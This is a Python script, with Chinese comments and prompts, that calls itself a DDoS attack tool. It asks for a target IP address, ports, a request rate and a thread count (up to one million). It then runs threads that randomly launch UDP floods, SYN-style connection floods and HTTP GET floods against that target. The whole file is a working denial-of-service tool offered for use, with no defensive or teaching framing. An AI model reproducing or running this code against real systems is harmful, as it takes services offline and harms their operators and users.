import socket
import threading
import random
import http.client
from queue import Queue
import time
import re

def is_valid_ip(ip):
    """验证IPv4或IPv6地址是否有效"""
    # IPv4验证
    ipv4_pattern = re.compile(r'^(\d{1,3}\.){3}\d{1,3}$')
    if ipv4_pattern.match(ip):
        parts = ip.split('.')
        for part in parts:
            if not 0 <= int(part) <= 255:
                return False
        return True
    
    # IPv6验证
    ipv6_pattern = re.compile(
        r'^([0-9a-fA-F]{1,4}:){7}[0-9a-fA-F]{1,4}$|'
        r'^::([0-9a-fA-F]{1,4}:){0,6}[0-9a-fA-F]{1,4}$|'
        r'^([0-9a-fA-F]{1,4}:){1,6}::([0-9a-fA-F]{1,4}:){0,5}[0-9a-fA-F]{1,4}$'
    )
    return bool(ipv6_pattern.match(ip))

def get_socket_family(ip):
    """根据IP地址返回socket地址族"""
    return socket.AF_INET6 if ':' in ip else socket.AF_INET

def send_udp_requests(ip, ports, speed, queue):
    family = get_socket_family(ip)
    sock = socket.socket(family, socket.SOCK_DGRAM)
    packet_count = 0
    try:
        while True:
            port = random.choice(ports)
            data = b"Test UDP Packet"
            sock.sendto(data, (ip, port))
            packet_count += 1
            queue.put(f"已发送第 {packet_count} 个UDP数据包到 {ip}:{port}")
            time.sleep(1 / speed)
    except KeyboardInterrupt:
        queue.put("用户手动终止，停止发送UDP数据包。")
    except Exception as e:
        queue.put(f"UDP 发送发生错误: {e}")
    finally:
        sock.close()

def send_syn_flood(ip, ports, speed, queue):
    family = get_socket_family(ip)
    sockets = []
    for _ in range(10):
        sock = socket.socket(family, socket.SOCK_STREAM)
        sock.setblocking(0)
        sockets.append(sock)
    packet_count = 0
    try:
        while True:
            port = random.choice(ports)
            for sock in sockets:
                try:
                    sock.connect_ex((ip, port))
                except BlockingIOError:
                    pass
                packet_count += 1
                queue.put(f"已发送第 {packet_count} 个SYN包到 {ip}:{port}")
            time.sleep(1 / speed)
    except KeyboardInterrupt:
        queue.put("用户手动终止，停止发送SYN包。")
    except Exception as e:
        queue.put(f"SYN 发送发生错误: {e}")
    finally:
        for sock in sockets:
            sock.close()

def send_http_flood(ip, ports, speed, queue):
    connection_pool = []
    for _ in range(10):
        port = random.choice(ports)
        try:
            if ':' in ip:  # IPv6地址需要加方括号
                conn = http.client.HTTPConnection(f"[{ip}]", port=port)
            else:
                conn = http.client.HTTPConnection(ip, port=port)
            connection_pool.append(conn)
        except Exception as e:
            queue.put(f"创建HTTP连接出错: {e}")
    
    pool_index = 0
    packet_count = 0
    try:
        while True:
            conn = connection_pool[pool_index]
            try:
                conn.request("GET", "/")
                response = conn.getresponse()
                packet_count += 1
                queue.put(f"已发送第 {packet_count} 个HTTP请求到 {ip}:{conn.port}")
            except Exception as e:
                queue.put(f"HTTP请求出错: {e}")
                conn.close()
                port = random.choice(ports)
                if ':' in ip:
                    connection_pool[pool_index] = http.client.HTTPConnection(f"[{ip}]", port=port)
                else:
                    connection_pool[pool_index] = http.client.HTTPConnection(ip, port=port)
            pool_index = (pool_index + 1) % len(connection_pool)
            time.sleep(1 / speed)
    except KeyboardInterrupt:
        queue.put("用户手动终止，停止发送HTTP请求。")
    except Exception as e:
        queue.put(f"HTTP 发送发生错误: {e}")
    finally:
        for conn in connection_pool:
            conn.close()

def print_output(queue):
    while True:
        message = queue.get()
        if message is None:
            break
        print(message)

def Threaded_Multi_Packet_dos_main():
    print("DDOS 攻击 (支持IPv4/IPv6)")
    while True:
        ip_address = input("请输入IP地址: ").strip()
        if is_valid_ip(ip_address):
            break
        print("错误: 无效的IP地址格式，请输入有效的IPv4或IPv6地址")
    
    print("多个端口用逗号分隔\n端口范围: 1 ~ 65535")
    port_numbers = input("请输入端口号: ")
    port_numbers = [int(port.strip()) for port in port_numbers.split(",")]
    
    request_speed = float(input("请输入请求速度(1 ~ 1 000): "))
    if request_speed < 0:
        raise ValueError("请求速度必须大于 0")
    elif request_speed > 1000:
        raise ValueError("请求速度必须小于 1 000")
    
    print("线程数量会影响程序性能，请根据实际情况调整\n建议数量 1 000 ~ 1 000 000")
    thread_count = int(input("请输入线程数量: "))
    if thread_count < 0:
        raise ValueError("线程数量必须大于 0")
    elif thread_count > 1000000:
        raise ValueError("线程数量必须小于 1 000 000")
    
    attack_types = ['udp', 'syn', 'http']
    threads = []
    output_queue = Queue()
    output_thread = threading.Thread(target=print_output, args=(output_queue,))
    output_thread.start()
    
    for i in range(thread_count):
        attack_type = random.choice(attack_types)
        if attack_type == 'udp':
            thread = threading.Thread(target=send_udp_requests, args=(ip_address, port_numbers, request_speed, output_queue))
        elif attack_type == 'syn':
            thread = threading.Thread(target=send_syn_flood, args=(ip_address, port_numbers, request_speed, output_queue))
        elif attack_type == 'http':
            thread = threading.Thread(target=send_http_flood, args=(ip_address, port_numbers, request_speed, output_queue))
        threads.append(thread)
        thread.start()
    
    try:
        for thread in threads:
            thread.join()
    except KeyboardInterrupt:
        print("主程序被用户手动终止。")
    finally:
        output_queue.put(None)
        output_thread.join()

if __name__ == "__main__":
    Threaded_Multi_Packet_dos_main()